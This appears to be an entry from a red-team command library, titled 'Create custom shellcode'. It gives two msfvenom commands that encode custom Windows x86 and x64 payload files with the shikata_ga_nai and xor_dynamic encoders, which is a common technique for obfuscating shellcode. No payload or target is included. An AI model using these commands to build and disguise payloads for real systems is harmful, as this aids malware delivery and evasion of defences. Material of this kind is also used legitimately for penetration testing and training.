---
id: dfc2562c-6067-4630-97de-7122ec72274e
name: Create custom shellcode
type: command
executor: bash
data: 'msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows
  -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b ''\x00''

  msfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e
  x64/xor_dynamic -f raw -o shellcode-64.bin -b ''\x00'''
output: null
created_at: '2023-04-06T03:56:23.232623+00:00'
updated_at: '2023-04-10T20:36:50.027825+00:00'
---

# Create custom shellcode

```bash
msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b '\x00'
msfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b '\x00'
```


